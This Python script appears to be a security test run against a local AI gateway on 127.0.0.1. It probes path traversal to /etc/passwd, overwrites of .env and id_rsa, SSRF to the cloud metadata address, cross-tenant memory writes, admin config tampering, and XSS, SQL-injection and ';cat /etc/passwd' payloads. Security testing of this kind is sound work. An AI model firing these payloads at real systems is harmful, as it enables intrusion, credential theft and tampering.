#!/usr/bin/env python3
import requests, json, os, sys, time

BASE = 'http://127.0.0.1:18889'
KEY = 'redteam-test-key-2026'

def r(m, p, j=None, d=None, h=None):
    hh = {'X-API-Key': KEY}
    if h:
        hh.update(h)
    if m == 'GET':
        return requests.get(BASE + p, headers=hh, timeout=10)
    if m == 'POST':
        return requests.post(BASE + p, headers=hh, json=j, data=d, timeout=10)
    return requests.request(m, BASE + p, headers=hh, json=j, data=d, timeout=10)

print('=== HEALTH INFO LEAK ===')
resp = requests.get(BASE + '/health', timeout=5)
print(f'/health no-auth: {resp.status_code} {resp.text}')

print('=== /api/status ===')
resp = r('GET', '/api/status')
print(f'/api/status auth: {resp.status_code} {resp.text[:500]}')

print('=== TOOLS LIST ===')
resp = r('GET', '/api/tools/list')
print(f'tools/list: {resp.status_code} {resp.text[:500]}')

print('=== FILE READ (auth) ===')
for path in ['../../../etc/passwd', '/etc/passwd', 'config.json']:
    resp = r('POST', '/api/tools/execute', j={'tool': 'tars_file_read', 'params': {'path': path}})
    print(f'  read {path}: {resp.status_code} {resp.text[:200]}')

print('=== FILE LIST (auth) ===')
resp = r('POST', '/api/tools/execute', j={'tool': 'tars_file_list', 'params': {'path': '/tmp/tsg-test/data'}})
print(f'  list data: {resp.status_code} {resp.text[:300]}')

resp = r('POST', '/api/tools/execute', j={'tool': 'tars_file_list', 'params': {'path': 'symlink_escape'}})
print(f'  symlink list: {resp.status_code} {resp.text[:200]}')

print('=== FILE WRITE (auth) ===')
for fn in ['config.json', '.env', 'id_rsa', 'gateway-key.txt']:
    resp = r('POST', '/api/tools/execute', j={'tool': 'tars_file_write', 'params': {'path': fn, 'content': 'EVIL'}})
    print(f'  write {fn}: {resp.status_code} {resp.text[:200]}')

print('=== ADMIN ENDPOINTS ===')
for ep in ['/api/admin/v322/status', '/api/admin/gatekeeper/rules', '/api/admin/audit/verify']:
    resp = r('GET', ep)
    print(f'  {ep}: {resp.status_code} {resp.text[:200]}')

print('=== SHARED MEMORY ===')
resp = r('POST', '/api/context/memory', j={'namespace': 'tenant:default', 'key': 'test', 'value': 'val'})
print(f'  write tenant: {resp.status_code} {resp.text[:200]}')
resp = r('POST', '/api/context/memory', j={'namespace': 'global', 'key': 'test', 'value': 'val'})
print(f'  write global: {resp.status_code} {resp.text[:200]}')
resp = r('POST', '/api/context/memory', j={'namespace': 'user:other/other', 'key': 'test', 'value': 'val'})
print(f'  write cross-tenant: {resp.status_code} {resp.text[:200]}')

print('=== CHAT XSS ===')
resp = r('POST', '/api/chat/completions', j={'model': 'test', 'messages': [{'role': 'user', 'content': '<script>alert(1)</script>'}]})
print(f'  chat XSS: {resp.status_code} {resp.text[:200]}')

print('=== SSRF AUTH ===')
for url in ['http://127.0.0.1:18889/api/admin/users', 'file:///etc/passwd', 'http://169.254.169.254/']:
    resp = r('POST', '/api/tools/execute', j={'tool': 'tars_fetch_url', 'params': {'url': url}})
    print(f'  fetch {url[:40]}: {resp.status_code} {resp.text[:200]}')

print('=== WAF BYPASS AUTH ===')
payloads = ['../../../etc/passwd', ';cat /etc/passwd', '<script>alert(1)</script>', "' OR '1'='1"]
for payload in payloads:
    resp = r('POST', '/api/chat/completions', j={'model': 'test', 'messages': [{'role': 'user', 'content': payload}]})
    print(f'  chat payload: {resp.status_code} {resp.text[:100]}')

print('=== KEY ROTATE ===')
resp = r('POST', '/api/admin/key-rotate', j={})
print(f'  key-rotate: {resp.status_code} {resp.text[:200]}')

print('=== CONFIG RELOAD ===')
resp = r('POST', '/api/admin/config/reload', j={})
print(f'  config reload: {resp.status_code} {resp.text[:200]}')

print('=== CONFIG WRITE ===')
resp = r('POST', '/api/admin/config', j={'security': {'apiKey': 'hacked'}})
print(f'  config write: {resp.status_code} {resp.text[:200]}')

print('=== OVERSIZED BODY ===')
resp = r('POST', '/api/chat/completions', d='x' * (12 * 1024 * 1024), h={'Content-Type': 'application/json'})
print(f'  12MB body: {resp.status_code} {resp.text[:100]}')

print('=== MODELS ===')
resp = r('GET', '/api/models')
print(f'  models: {resp.status_code} {resp.text[:300]}')

print('=== PROVIDERS (leak?) ===')
resp = r('GET', '/api/admin/v32/providers')
print(f'  providers: {resp.status_code} {resp.text[:300]}')

print('=== AUDIT EXPORT ===')
resp = r('GET', '/api/admin/audit/export')
print(f'  audit export: {resp.status_code} ct={resp.headers.get("Content-Type","N/A")} len={len(resp.text)}')
if resp.status_code == 200:
    lines = resp.text.strip().split('\n')
    print(f'  first 3 lines:')
    for line in lines[:3]:
        print(f'    {line[:200]}')

print('=== CONNECTORS ===')
resp = r('GET', '/api/admin/v34/connectors')
print(f'  connectors: {resp.status_code} {resp.text[:300]}')

print('=== RATE LIMIT AFTER PAUSE ===')
statuses = []
for i in range(15):
    resp = r('GET', '/api/models')
    statuses.append(resp.status_code)
    if resp.status_code == 429:
        print(f'  rate limited at req {i+1}')
        break
print(f'  statuses: {statuses}')
